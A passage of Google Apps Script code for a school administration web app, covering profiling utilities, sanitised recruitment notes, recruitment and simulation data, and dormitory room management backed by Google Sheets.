// back to six separate reads, which looks like "the optimisation did nothing".
function authoriseServices() {
  _requireMaintenanceUnlock_("authoriseServices");
  let lines = [];

  try {
    const id = SpreadsheetApp.getActiveSpreadsheet().getId();
    lines.push("SpreadsheetApp  OK  (" + id.substring(0, 12) + "…)");
  } catch (e) {
    lines.push("SpreadsheetApp  FAILED  " + e.message);
  }

  if (typeof Sheets === 'undefined') {
    lines.push("Sheets service  MISSING  — advanced service not enabled in appsscript.json");
  } else {
    try {
      const res = Sheets.Spreadsheets.Values.batchGet(
        SpreadsheetApp.getActiveSpreadsheet().getId(),
        { ranges: ["'" + SHEET_RECRUIT_META + "'!A1:A1"] });
      const n = (res && res.valueRanges) ? res.valueRanges.length : 0;
      lines.push("Sheets service  OK  (" + n + " range returned)");
    } catch (e) {
      lines.push("Sheets service  FAILED  " + e.message);
    }
  }

  // The real thing the view depends on.
  try {
    const b = _recruitBatchValues_();
    lines.push(b
      ? "_recruitBatchValues_  OK  " + Object.keys(b).map(function(k){ return k + ":" + b[k].length; }).join(" ")
      : "_recruitBatchValues_  NULL — falling back to six separate reads");
  } catch (e) {
    lines.push("_recruitBatchValues_  FAILED  " + e.message);
  }

  // Settings that name real resources (see CONFIGURATION). Each folder, file and
  // spreadsheet is opened, so a wrong ID shows here rather than on a save.
  [[CONFIG_PHOTO_FOLDER, "folder", true], [CONFIG_UPLOADS_FOLDER, "folder", true],
   [CONFIG_STUDENT_SOURCE, "spreadsheet", true],
   [CONFIG_NOTIFY_FROM, "email", false], [CONFIG_FAVICON_FILE, "file", false]].forEach(function (c) {
    const v = _configValue_(c[0]);
    if (v === "") { lines.push(c[0] + "  " + (c[2] ? "NOT SET — required" : "not set (optional)")); return; }
    try {
      if (c[1] === "folder") lines.push(c[0] + "  OK  (" + DriveApp.getFolderById(v).getName() + ")");
      else if (c[1] === "file") lines.push(c[0] + "  OK  (" + DriveApp.getFileById(v).getName() + ")");
      else if (c[1] === "spreadsheet") lines.push(c[0] + "  OK  (" + SpreadsheetApp.openById(v).getName() + ")");
      else lines.push(c[0] + "  set");
    } catch (e) {
      lines.push(c[0] + "  FAILED  " + e.message);
    }
  });

  const out = "\n  " + lines.join("\n  ") + "\n";
  Logger.log(out);
  return out;
}


// Run this from the Apps Script editor to find out where load time actually
// goes, before changing anything. Reports, per producer, wall-clock ms and the
// serialised payload size — the bytes that actually cross the wire, which is
// often the real cost rather than the sheet read.
//
// Two things to know when reading the output:
//   * Run it TWICE. `_cached_` producers (liveReport, recruitment) hit
//     CacheService on the second run, so run 1 is the cold number and run 2 is
//     the warm one. Both matter; they bracket what a real user sees.
//   * The per-execution `_tabMemo` is cleared before each measurement, so one
//     producer can't make the next one look free.
function profileApp() {
  _requireMaintenanceUnlock_("profileApp");
  let lines = [];
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const pad = function (s, n) { s = String(s); while (s.length < n) s += " "; return s; };

  lines.push("--- sheet sizes (rows x cols) ---");
  ["Central_DB", "Past_DB", "Schedule_DB", SESSION_SHEET, "Staff_Master",
   "Teacher_Master", SHEET_ANNOUNCEMENTS, INTERVIEW_RESULTS_SHEET, SHEET_ROOM,
   SHEET_BUILDING, PLACEMENT_CONFIG_SHEET, "Activity_Log"].forEach(function (n) {
    try {
      const sh = ss.getSheetByName(n);
      lines.push("  " + pad(n, 22) + (sh ? sh.getLastRow() + " x " + sh.getLastColumn()
                                          : "(missing)"));
    } catch (e) { lines.push("  " + pad(n, 22) + "ERROR " + e.message); }
  });

  lines.push("");
  lines.push("--- producers (ms / payload bytes) ---");

  // ⚠️ EVERY producer below is guarded, and since AUTH_ENFORCE=1 the guards read
  // the SESSION, not the "master" argument these calls pass. Run from the editor
  // there is no session, so _effectiveRole_ returns "" and each one throws — which
  // is exactly what this function did between the flip and this fix.
  //
  // It did not look broken, and that is the part worth remembering: the failures
  // still print a ms figure, and _bootPayload_ did not even fail. wantsNotif
  // evaluated false, so it skipped the Schedule_DB read and the notifications and
  // returned {} — reported as a healthy-looking "343 ms / 2 bytes" against a
  // documented baseline of 327 ms / 158 KB. The BYTES column was the only tell.
  //
  // Same fix and same reasoning as triggerAutoSyncStudents: running this at all
  // requires editor access to the project, so that IS the authorisation. State it
  // rather than let every measurement be silently denied.
  const wasAuthUser = _authUser;
  _authUser = { role: "master", id: "MASTER", name: "システム", permissions: "ALL" };

  // ⚠️ THREE RUNS, AND READ THE MEDIAN. A single sample cannot support an
  // optimisation decision here, and this was measured rather than assumed: two
  // consecutive profiles returned BYTE-IDENTICAL payloads with wall-clock times
  // differing by up to 2.4x — and in both directions. getAnnouncements went
  // 233→564ms while getRecruitmentBundle went 952→577ms on the same data. Off
  // the first run alone, getRecruitmentBundle looked like the obvious thing to
  // optimise; it is mid-pack.
  //
  // So: the PAYLOAD column is stable and trustworthy. The ms column is Apps
  // Script's shared infrastructure as much as it is this code.
  const PROFILE_RUNS = 3;

  // `runs` overrides PROFILE_RUNS for measurements that must not be repeated.
  const time = function (label, fn, runs) {
    const n = runs || PROFILE_RUNS;
    let ms = [], bytes = "-", note = "";
    for (let k = 0; k < n; k++) {
      // Cleared before EVERY repeat, not just the first — otherwise runs 2 and 3
      // are subsidised by the per-execution read memo and collapse to nothing.
      //
      // CacheService is deliberately NOT cleared: a _cached_ producer warming up
      // across the three figures is real behaviour, and the one thing these
      // numbers genuinely show. interviewResults and liveReport are the two.
      _tabMemo = {};
      const t0 = Date.now();
      try {
        const r = fn();
        if (k === 0) {
          try { bytes = JSON.stringify(r === undefined ? null : r).length; }
          catch (e) { bytes = "(unserialisable)"; }
        }
      } catch (e) {
        note = "  FAILED: " + e.message;
        ms.push(Date.now() - t0);
        break;   // a guard that refuses once refuses three times; don't wait
      }
      ms.push(Date.now() - t0);
    }
    const sorted = ms.slice().sort(function (a, b) { return a - b; });
    const median = sorted.length ? sorted[Math.floor(sorted.length / 2)] : "-";
    lines.push("  " + pad(label, 30) + pad(ms.join(" / ") + " ms", 22) +
               pad("med " + median, 9) + pad(bytes, 12) + note);
  };

  try {
  // Baseline: what an execution costs before touching any data at all.
  time("(no-op)", function () { return 1; });
  time("SpreadsheetApp handle", function () {
    return SpreadsheetApp.getActiveSpreadsheet().getId().length;
  });

  // Boot path, piece by piece.
  time("_resolveUserById_(master)", function () { return _resolveUserById_("master", "MASTER"); });
  time("getDashboardData (no past)", function () { return getDashboardData("master", false); });
  time("getDashboardData (+past)", function () { return getDashboardData("master", true); });
  time("getPendingNotifications", function () { return getPendingNotifications(""); });
  time("getAnnouncements", function () { return getAnnouncements("master", "ALL", "MASTER"); });

  // …and the bundle that now replaces all four of them in a single call.
  // This is the number to compare against their sum.
  time("_bootPayload_ (replaces 4)", function () {
    return _bootPayload_({ role: "master", id: "MASTER", name: "システム", permissions: "ALL" });
  });

  // Per-view loads.
  // Measured the way the app actually calls it — "" for every week, because
  // calLoadData fetches the whole schedule so week navigation needs no round
  // trip. The one-week figure is kept alongside it to show what that costs.
  const mon = new Date();
  mon.setDate(mon.getDate() - ((mon.getDay() + 6) % 7));   // this week's Monday
  const monStr = Utilities.formatDate(mon, Session.getScriptTimeZone(), "yyyy-MM-dd");
  time("getAllTeachersSchedule (all)", function () { return getAllTeachersSchedule(""); });
  time("getAllTeachersSchedule (1wk)", function () { return getAllTeachersSchedule(monStr); });
  time("getDormData", function () { return getDormData("master"); });
  time("getInterviewResults", function () { return getInterviewResults("master", "ALL"); });
  time("getLiveReportData", function () { return getLiveReportData("master"); });
  time("getRecruitmentBundle", function () { return getRecruitmentBundle("master", "ALL", "", true); });

  // The save path. saveScheduleBatch itself is not run here (it writes), but
  // these are its fixed costs. Routine saves take no snapshot any more (the 3×/day
  // triggerScheduledBackup copies instead) and the Drive lookup only happens on a real
  // upload, so the figures below are what a save USED to pay every time.
  lines.push("");
  lines.push("--- save-path costs (now avoided on most saves) ---");
  // ⚠️ ONCE, not PROFILE_RUNS times. Each call writes a real backup into a
  // rotation that keeps only SNAPSHOT_KEEP per sheet, so profiling three
  // times would discard three genuine Schedule_DB backups on every run. The
  // recovery path is worth more than a tighter number on a figure that is
  // already unambiguous.
  time("_snapshotSheet_(Schedule_DB)", function () { _snapshotSheet_("Schedule_DB"); return "done"; }, 1);
  time("DriveApp.getFolderById", function () { return DriveApp.getFolderById(_requireConfig_(CONFIG_UPLOADS_FOLDER)).getName(); });
  time("Schedule_DB full read", function () {
    return SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Schedule_DB")
             .getDataRange().getDisplayValues().length;
  });

  // Sum of the boot calls, which is roughly what a cold login pays today on
  // top of ~1s of per-call overhead each.
  lines.push("");
  lines.push("  Each google.script.run call also pays ~1s of fixed overhead");
  lines.push("  (HTTPS + container start + parsing all of Code.js).");

  } finally {
    // Restored in a finally: an early throw would otherwise leave a master
    // session parked for the rest of the execution.
    _authUser = wasAuthUser;
  }

  const out = "\n" + lines.join("\n") + "\n";
  Logger.log(out);
  return out;
}


// Times each step INSIDE _snapshotSheet_. The whole call measured 2108ms on
// staging; this says which part of it that actually is, so the fix targets the
// right thing. Run from the editor. It does take a real snapshot (and prunes),
// which is harmless — that is what the function does anyway.
function profileSnapshot(sheetName) {
  _requireMaintenanceUnlock_("profileSnapshot");
  sheetName = sheetName || "Schedule_DB";
  let lines = [], t;
  const lap = function (label) {
    const now = Date.now();
    lines.push("  " + label + ": " + (now - t) + " ms");
    t = now;
  };

  const t0 = Date.now();
  t = t0;
  const src = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(sheetName);
  lap("getSheetByName(src)");
  if (!src) return "no such sheet: " + sheetName;

  const props = PropertiesService.getScriptProperties();
  const id = props.getProperty(BACKUP_PROP_KEY);
  lap("read BACKUP_SPREADSHEET_ID prop");

  const backup = SpreadsheetApp.openById(id);
  lap("openById(backup)   <-- opening the external backup file");

  const before = backup.getSheets().length;
  lap("backup.getSheets() [" + before + " tabs]");

  const copied = src.copyTo(backup);
  lap("src.copyTo(backup) <-- the cross-document copy");

  const stamp = Utilities.formatDate(new Date(), Session.getScriptTimeZone() || "Asia/Tokyo", "yyyyMMdd_HHmmss");
  const newName = sheetName + "__" + stamp + "_PROFILE";
  copied.setName(newName);
  lap("setName");

  // Prune this profiling tab straight back out so the run leaves nothing behind.
  backup.deleteSheet(copied);
  lap("deleteSheet (cleanup)");

  lines.push("  ---");
  lines.push("  TOTAL: " + (Date.now() - t0) + " ms");
  lines.push("  backup file has " + before + " tabs; SNAPSHOT_KEEP=" + SNAPSHOT_KEEP);
  const out = "\n" + lines.join("\n") + "\n";
  Logger.log(out);
  return out;
}


// ---- 連絡事項 (manager notes), one row per intake. Stored as limited HTML.
function _getNoteSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_RECRUIT_NOTE);
  if (!sh) {
    sh = ss.insertSheet(SHEET_RECRUIT_NOTE);
    sh.appendRow(["入学期", "内容", "更新者", "更新日時", "リスト提出日", "申請日", "結果", "担当"]);
    sh.setFrozenRows(1);
  }
  _ensureNoteColumns_(sh);
  return sh;
}

// 担当 (column H) added after the sheet was in use. Widened on demand rather than
// by migration — same reasoning as _ensureCancelColumns_.
function _ensureNoteColumns_(sheet) {
  try {
    if (sheet.getMaxColumns() < NOTE_COLS) {
      sheet.insertColumnsAfter(sheet.getMaxColumns(), NOTE_COLS - sheet.getMaxColumns());
    }
    const cell = sheet.getRange(1, NOTE_COLS);
    if (String(cell.getDisplayValue() || "").trim() === "") cell.setValue("担当");
  } catch (e) { /* best-effort */ }
}

// Server-side guard: strip anything executable before it is ever stored.
// The client sanitises too, but this is the copy that gets served to everyone.
function _sanitizeNoteHtml_(html) {
  let s = String(html == null ? "" : html);
  s = s.replace(/<\s*script[^>]*>[\s\S]*?<\s*\/\s*script\s*>/gi, "");
  s = s.replace(/<\s*(iframe|object|embed|link|meta|style)[^>]*>[\s\S]*?<\s*\/\s*\1\s*>/gi, "");
  s = s.replace(/<\s*(iframe|object|embed|link|meta|style|script)[^>]*\/?>/gi, "");
  s = s.replace(/\son\w+\s*=\s*"[^"]*"/gi, "");     // onclick="…"
  s = s.replace(/\son\w+\s*=\s*'[^']*'/gi, "");
  s = s.replace(/\son\w+\s*=\s*[^\s>]+/gi, "");
  s = s.replace(/javascript\s*:/gi, "");
  if (s.length > 20000) s = s.substring(0, 20000);   // keep it well inside a cell
  return s;
}

function getRecruitmentNote(role, perms, intake, pre) {
  if (!_hasRecruitPerm_(role, perms, "view_recruitment")) throw new Error("権限がありません");
  const it = String(intake || "").trim();
  if (it === "") return { html: "", by: "", at: "" };
  const data = pre || _getNoteSheet_().getDataRange().getDisplayValues();
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() === it) {
      return { html: _sanitizeNoteHtml_(data[i][1]), by: String(data[i][2] || ""), at: String(data[i][3] || ""),
               listDate: String(data[i][4] || ""), applyDate: String(data[i][5] || ""),
               resultDate: String(data[i][6] || ""), charge: String(data[i][7] || "") };
    }
  }
  return { html: "", by: "", at: "", listDate: "", applyDate: "", resultDate: "" };
}

// Key dates for an intake (リスト提出日 / 申請日 / 結果). Manager-level, like the
// announcement box they sit above. Stored on the same row as the note, since
// both are per-intake facts rather than separate records.
// ⚠️ `charge` is the LAST parameter, deliberately. There is one call site, but an
// appended argument a caller forgets arrives as "" — inserting it would have
// shifted actorName into the charge slot and written a person's name as the 担当.
function saveRecruitmentDates(role, perms, intake, listDate, applyDate, resultDate, actorName, actorId, charge) {
  if (!_hasRecruitPerm_(role, perms, "manage_recruitment")) throw new Error("権限がありません");
  const it = String(intake || "").trim();
  if (it === "") throw new Error("入学期を選択してください。");

  const sh = _getNoteSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const vals = [String(listDate || "").trim(), String(applyDate || "").trim(), String(resultDate || "").trim()];
  const chg = String(charge || "").trim();

  let found = -1;
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() === it) { found = i + 1; break; }
  }
  if (found > 0) {
    // Columns 5-7 then 8 separately: saveRecruitmentNote owns 2-4, and the two
    // writers share a row only because their column blocks are disjoint.
    sh.getRange(found, 5, 1, 3).setValues([vals]);
    sh.getRange(found, NOTE_COLS).setValue(chg);
  } else {
    sh.appendRow([it, "", actorName || "", "", vals[0], vals[1], vals[2], chg]);
  }
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "募集日程を更新", it, vals.join(" / ") + (chg ? " / 担当 " + chg : "")); } catch (e) {}
  return { saved: true };
}

function saveRecruitmentNote(role, perms, intake, html, actorName, actorId) {
  // Announcements are manager-level: everyone reads them, only 管理 can write.
  if (!_hasRecruitPerm_(role, perms, "manage_recruitment")) throw new Error("権限がありません");
  const it = String(intake || "").trim();
  if (it === "") throw new Error("入学期を選択してください。");
  const clean = _sanitizeNoteHtml_(html);
  const stamp = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy/MM/dd HH:mm");

  const sh = _getNoteSheet_();
  const data = sh.getDataRange().getDisplayValues();
  let found = -1;
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() === it) { found = i + 1; break; }
  }
  if (found > 0) sh.getRange(found, 2, 1, 3).setValues([[clean, actorName || "", stamp]]);
  else sh.appendRow([it, clean, actorName || "", stamp]);
  return { saved: true, by: actorName || "", at: stamp };
}


// One round trip for everything the 募集状況 tab needs. Each google.script.run
// call carries ~0.3-1s of fixed overhead regardless of payload, so collapsing
// three calls into one is a bigger win than shrinking any single response.
// The pieces are individually cached server-side, so this stays cheap.
function getRecruitmentBundle(role, perms, intake, needContext) {
  if (!_hasRecruitPerm_(role, perms, "view_recruitment")) throw new Error("権限がありません");
  const it = String(intake || "").trim();
  // Read all six tabs once, then hand the slices down — the whole bundle costs
  // a single Sheets round trip instead of six.
  const batch = _recruitBatchValues_();
  const data = getRecruitmentData(role, perms, it, true, batch);
  let out = { data: data };

  // A blank intake was resolved to the newest one above, so lastYear and the
  // note can be answered on THIS trip instead of being skipped and forcing the
  // client to come back for them.
  const eff = data.resolvedIntake || it;

  // Vocabularies only on first open — they rarely change within a session.
  if (needContext) out.context = getRecruitmentContext(role, perms);

  // Previous-year figures only make sense for a concrete intake.
  if (eff !== "") {
    try { out.lastYear = getLastYearCourseCounts(role, perms, eff); }
    catch (e) { out.lastYear = { available: false, counts: {} }; }
    try { out.note = getRecruitmentNote(role, perms, eff, batch ? batch.note : null); }
    catch (e) { out.note = { html: "", by: "", at: "" }; }
  }
  return out;
}

// Vocabularies + enrolled counts for the 募集状況 view, in one call:
//  - intakes/courses from PlacementTest_Config (same source as bookings/results)
//  - nationalities from the simulation's real stats (actual Central_DB values)
//  - staff names from Staff_Master (募集担当者 dropdown)
//  - enrolled: "入学期||コース" -> current real student count
function getRecruitmentContext(role, perms) {
  if (!_hasRecruitPerm_(role, perms, "view_recruitment")) throw new Error("権限がありません");
  return _cached_('recruitCtx', CACHE_TTL_SHORT, _recruitmentContextUncached_);
}

// Courses actually configured for each intake month, read from
// PlacementTest_Config: { "1": [...], "4": [...], "7": [...], "10": [...] }.
// The grid falls back to its built-in map for any month with no config, so this
// only ever adds accuracy — but it means a course renamed in the config is
// reflected in 募集状況 instead of silently ceasing to match.
// Pass `pd` if the caller has already read PlacementTest_Config — the context
// builder has, and re-reading the same sheet twice in one request is a wasted
// round trip. Called bare it reads the sheet itself, as before.
function _coursesByIntakeMonth_(pd) {
  let out = {};
  if (!pd) {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const pSheet = ss.getSheetByName(PLACEMENT_CONFIG_SHEET);
    if (!pSheet) return out;
    pd = pSheet.getDataRange().getDisplayValues();
  }
  for (let i = 1; i < pd.length; i++) {
    const it = String(pd[i][0] || "").trim();
    const co = String(pd[i][1] || "").trim();
    if (!it || !co) continue;
    const m = it.match(/(\d{1,2})\s*月/);
    if (!m) continue;
    const month = String(parseInt(m[1], 10));
    if (!out[month]) out[month] = [];
    if (out[month].indexOf(co) === -1) out[month].push(co);
  }
  return out;
}

function _recruitmentContextUncached_() {
  // Central_DB is requested here alongside the two config tabs even though it is
  // consumed further down via _getRealStats_ — asking for it now means all three
  // arrive in ONE batched call rather than this function making two and
  // _getRealStats_ making a third.
  const tabs = _readTabs_([PLACEMENT_CONFIG_SHEET, "Staff_Master", "Central_DB"]);

  let intakes = [], courses = {}, seenI = {};
  // Held at function scope so _coursesByIntakeMonth_ can reuse it below instead
  // of reading the same sheet a second time.
  const pd = tabs[PLACEMENT_CONFIG_SHEET];
  if (pd && pd.length) {
    for (let i = 1; i < pd.length; i++) {
      const it = String(pd[i][0] || "").trim();
      const co = String(pd[i][1] || "").trim();
      if (it && !seenI[it]) { seenI[it] = 1; intakes.push(it); }
      if (co) courses[co] = true;
    }
  }

  let staff = [];
  const sd = tabs["Staff_Master"];
  if (sd && sd.length) {
    for (let i = 1; i < sd.length; i++) {
      const nm = String(sd[i][1] || "").trim();
      if (nm && staff.indexOf(nm) === -1) staff.push(nm);
    }
  }

  // Real enrolled numbers, reusing the simulation's own stats so 現在 can never
  // disagree with the simulation grid. NOTE: _getRealStats_ aggregates by
  // country x course (Central_DB has no intake split), so enrolled is keyed by
  // COURSE only: "||コース". The view treats a missing intake-specific figure as
  // the course total rather than inventing a per-intake number.
  let nats = [], enrolled = {};
  try {
    const real = _getRealStats_();
    nats = (real.countries || []).slice();
    const byCC = real.realByCountryCourse || {};
    Object.keys(byCC).forEach(function(country){
      const courseMap = byCC[country] || {};
      Object.keys(courseMap).forEach(function(co){
        const k = "||" + co;
        enrolled[k] = (enrolled[k] || 0) + (Number(courseMap[co]) || 0);
      });
    });
  } catch (e) { /* context is best-effort; the view still works without it */ }

  return { intakes: intakes, courses: Object.keys(courses), nationalities: nats,
           staff: staff, enrolled: enrolled, coursesByMonth: _coursesByIntakeMonth_(pd) };
}

function getSimulationData(userRole, userPerms) {
  // Admin always allowed; others need the view_simulation permission.
  if (!_hasPerm_(userRole, userPerms, "view_simulation")) {
    throw new Error("権限がありません");
  }
  const ss = SpreadsheetApp.getActiveSpreadsheet();

  const structure = _simIntakeStructure_();
  const real = _getRealStats_();

  // Saved sim data — keyed "country||intake||course" -> count
  let simSheet = ss.getSheetByName("Simulation_DB");
  let simData = {};
  let simCountries = {};

  if (simSheet) {
    const rows = simSheet.getDataRange().getDisplayValues();
    // Format: ["国名","入学期","コース","予測数"]
    if (rows.length >= 1 && rows[0].length >= 4 &&
        String(rows[0][1]).trim() === "入学期" && String(rows[0][2]).trim() === "コース") {
      for (let i = 1; i < rows.length; i++) {
        const country = String(rows[i][0]).trim();
        const intake = String(rows[i][1]).trim();
        const course = _simNormCourse_(rows[i][2]);
        if (!country || !intake || !course) continue;
        const v = parseInt(rows[i][3], 10);
        simData[country + "||" + intake + "||" + course] = isNaN(v) ? 0 : v;
        simCountries[country] = true;
      }
    }
  }

  // Countries: real + any sim-only countries
  let countrySet = {};
  real.countries.forEach(c => countrySet[c] = true);
  Object.keys(simCountries).forEach(c => countrySet[c] = true);
  const countries = Object.keys(countrySet).sort((a, b) => (real.countryTotals[b] || 0) - (real.countryTotals[a] || 0));

  // Real counts per country×course, normalized course keys.
  // Base columns: each course shown separately (no grouping), in a fixed order.
  // 進学 variants first, then 就職, 文化. Counts are exact per-course.
  const baseGroups = ["進学1年", "進学2年", "進学1年9か月", "進学1年6か月", "進学1年3か月", "就職", "文化"];
  let realGrouped = {}; // {country: {<each baseGroup>: n}}
  Object.keys(real.realByCountryCourse).forEach(country => {
    realGrouped[country] = {};
    baseGroups.forEach(g => realGrouped[country][g] = 0);
    const byCourse = real.realByCountryCourse[country];
    Object.keys(byCourse).forEach(course => {
      // exact match against the base column list (course is already normalized to か月)
      if (baseGroups.indexOf(course) !== -1) realGrouped[country][course] += byCourse[course];
    });
  });

  return {
    structure: structure,                 // [{intake, courses:[..]}]
    baseGroups: baseGroups,               // each course as its own column
    countries: countries,
    countryTotals: real.countryTotals,    // {country: realTotal}
    realGrouped: realGrouped,             // {country: {<course>: n}}
    realByCountryCourse: real.realByCountryCourse, // {country: {normCourse: n}}
    simData: simData                       // {"country||intake||course": count}
  };
}

function saveSimulationData(userRole, rows, userPerms, actorName, actorId) {
  // rows: [ { country, intake, course, count }, ... ]  (only non-zero rows sent)
  // Admin always allowed; others need the edit_simulation permission.
  if (!_hasPerm_(userRole, userPerms, "edit_simulation")) {
    throw new Error("権限がありません");
  }
  const ss = SpreadsheetApp.getActiveSpreadsheet();

  let simSheet = ss.getSheetByName("Simulation_DB");
  if (!simSheet) simSheet = ss.insertSheet("Simulation_DB");
  _snapshotSheet_("Simulation_DB"); // back up before clear/rewrite
  simSheet.clear();

  const output = [["国名", "入学期", "コース", "予測数"]];
  (rows || []).forEach(r => {
    const country = String(r.country || "").trim();
    const intake = String(r.intake || "").trim();
    const course = _simNormCourse_(r.course);
    if (!country || !intake || !course) return;
    let v = parseInt(r.count, 10);
    if (isNaN(v) || v < 0) v = 0;
    output.push([country, intake, course, v]);
  });

  simSheet.getRange(1, 1, output.length, 4).setValues(output);
  _logActivity_({ role: userRole, name: actorName || "", id: actorId || "" }, "シミュレーション保存", "Simulation_DB", (output.length - 1) + "件");
  return "Success";
}


// Batched, but deliberately NOT cached. Nine different functions write to
// Room_Info / Building_Info (saveNewRoom, updateRoom, deleteRoom, saveBuilding,
// updateBuilding, deleteBuilding, syncDormsFromCentralDB and the two doc
// handlers). Each would need a matching cache bust, and one missed bust means a
// user edits a room and is shown the old value for the next five minutes —
// a far worse failure than the ~300ms a cache would save on one tab.
function getDormData(userRole, perms) {
  if (!_permOrLegacyRole_(userRole, perms, "view_dorms", ["sales"])) throw new Error("権限がありません");

  const tabs = _readTabs_([SHEET_BUILDING, SHEET_ROOM]);
  const bData = tabs[SHEET_BUILDING] || [];
  const rData = tabs[SHEET_ROOM] || [];

  let buildings = [];
  for (let i = 1; i < bData.length; i++) {
    if (bData[i][0] !== "") {
      buildings.push({
        id: bData[i][0],
        nameEn: bData[i][1],
        nameJp: bData[i][2],
        address: bData[i][4] || bData[i][3],
        rentDefault: bData[i][46] || "",  // 家賃 building default (for room-detail inheritance display)
        // Just the COUNT of 別紙, so the room list can flag which buildings have
        // them. Deliberately not the ids or names: getAllBuildingDocs resolves
        // every id through DriveApp one file at a time, which is far too slow to
        // put on the dorm tab's load path just to draw a badge.
        docCount: String(bData[i][44] || "").split(",")
                    .filter(function(s){ return s.trim() !== ""; }).length
      });
    }
  }

  buildings.sort((a, b) => {
    let nameA = a.nameJp || a.nameEn || a.id;
    let nameB = b.nameJp || b.nameEn || b.id;
    return String(nameA).localeCompare(String(nameB), 'ja');
  });

  let rooms = [];
  for (let i = 1; i < rData.length; i++) {
    if (rData[i][1] !== "" && rData[i][2] !== "") {
      rooms.push({
        rowIndex: i + 1,
        building: rData[i][1],
        roomNumber: rData[i][2],
        rentPrice: String(rData[i][3] == null ? "" : rData[i][3]).replace(/,/g, ''),
        mailboxCode: rData[i][4],
        deliveryBoxCode: rData[i][5],
        wifiInfo: rData[i][6],
        status: rData[i][7] || "空室",
        bicycleNumber: rData[i][8] || "",
        studentId: rData[i][9] || "",
        studentName: rData[i][10] || "",
        nationality: rData[i][11] || "",
        studentClass: rData[i][12] || "",
        roomCode: rData[i][13] || "",
        remarks: rData[i][14] || "",
        // Optional per-room bill overrides (cols 16-20 / idx 15-19). When set,
        // they replace the building's value for that bill on this room's PDF.
        waterBillOverride: rData[i][15] || "",
        elecBillOverride: rData[i][16] || "",
        gasBillOverride: rData[i][17] || "",
        internetBillOverride: rData[i][18] || "",
        otherBillOverride: rData[i][19] || "",
        hotWaterBillOverride: rData[i][20] || ""   // 給湯代 per-room override
      });
    }
  }
  // ⚠️ The sync runs unattended now, so its result has to arrive with the room list
  // rather than in an alert nobody was there to read.
  //
  // ⚠️ But only for people who can ACT on it. This endpoint is guarded by
  // view_dorms; the report is about a destructive nightly job, and everything that
  // answers it — 自動割当, Dorm_Aliases, the snapshot panel — is edit_dorms. Gated
  // on the DATA rather than by hiding the panel: hiding a div is not access control,
  // and setupInterfaceBasedOnRole would fight the renderer for its display anyway.
  return {
    buildings: buildings, rooms: rooms,
    lastSync: _hasPerm_(userRole, perms, "edit_dorms") ? _readDormSyncReport_() : null
  };
}

function getBuildingList(userRole, perms) {
  if (!_permOrLegacyRole_(userRole, perms, "view_dorms", ["sales"])) throw new Error("権限がありません");
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_BUILDING);
  if (!sheet) return [];
  const data = sheet.getDataRange().getValues();
  let buildings = [];
  for (let i = 1; i < data.length; i++) {
    if (data[i][0] !== "") buildings.push({ id: data[i][0], nameEn: data[i][1], nameJp: data[i][2] });
  }
  buildings.sort((a, b) => {
    let nameA = a.nameJp || a.nameEn || a.id;
    let nameB = b.nameJp || b.nameEn || b.id;
    return String(nameA).localeCompare(String(nameB), 'ja');
  });
  return buildings;
}

function saveNewRoom(userRole, formObject, userPerms) {
  if (!_hasPerm_(userRole, userPerms, "edit_dorms")) throw new Error("権限がありません");
  try {
    const roomSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_ROOM);

    // Duplicate guard: reject same building + room number.
    const existing = roomSheet.getDataRange().getDisplayValues();
    const newBldg = String(formObject.selectedBuilding || "").trim();
    const newRoom = String(formObject.roomNumber || "").trim().toLowerCase();
    for (let i = 1; i < existing.length; i++) {
      if (String(existing[i][1] || "").trim() === newBldg &&
          String(existing[i][2] || "").trim().toLowerCase() === newRoom) {
        throw new Error("DUPLICATE_ROOM:この建物に同じ部屋番号「" + formObject.roomNumber + "」が既に存在します。");
      }
    }

    roomSheet.appendRow(_cellSafeRow_([
      new Date(), formObject.selectedBuilding, formObject.roomNumber,
      formObject.rentPrice, formObject.mailboxCode, formObject.deliveryBoxCode,
      formObject.wifiInfo, formObject.occupancyStatus, formObject.bicycleNumber,
      formObject.studentId, formObject.studentName, formObject.nationality, formObject.studentClass,
      formObject.roomCode || "", formObject.remarks || "",
      _combineLang_(formObject.waterBillOverrideEn, formObject.waterBillOverrideJp),
      _combineLang_(formObject.elecBillOverrideEn, formObject.elecBillOverrideJp),
      _combineLang_(formObject.gasBillOverrideEn, formObject.gasBillOverrideJp),
      _combineLang_(formObject.internetBillOverrideEn, formObject.internetBillOverrideJp),
      _combineLang_(formObject.otherBillOverrideEn, formObject.otherBillOverrideJp),
      _combineLang_(formObject.hotWaterBillOverrideEn, formObject.hotWaterBillOverrideJp)
    ]));
    // The append may have coerced leading-zero text values (WiFi, codes, room
    // password) to numbers. Force those cells to text format, then re-write the
    // original string values so leading zeros are preserved.
    const newRow = roomSheet.getLastRow();
    try {
      roomSheet.getRange(newRow, 5, 1, 1).setNumberFormat("@").setValue(String(formObject.mailboxCode == null ? "" : formObject.mailboxCode));
      roomSheet.getRange(newRow, 6, 1, 1).setNumberFormat("@").setValue(String(formObject.deliveryBoxCode == null ? "" : formObject.deliveryBoxCode));
      roomSheet.getRange(newRow, 7, 1, 1).setNumberFormat("@").setValue(String(formObject.wifiInfo == null ? "" : formObject.wifiInfo));
      roomSheet.getRange(newRow, 14, 1, 1).setNumberFormat("@").setValue(String(formObject.roomCode == null ? "" : formObject.roomCode));
    } catch (e) { /* best-effort */ }
    _applyRoomInfoFormats_(roomSheet);
    _logActivity_(_actorFrom_(formObject, userRole), "部屋を追加", formObject.selectedBuilding + " " + formObject.roomNumber, "");
    return "部屋データを保存しました。";
  } catch (error) { throw new Error(error.toString()); }
}

// Apply persistent number/text formats to Room_Info so the web app's writes
// don't revert formatting. Rent_Price (col 4) -> #,##0; Mail_Box_Code (col 5),
// Delivery_Box_Code (col 6), Wifi_Info (col 7), and Room_Code/部屋パスワード
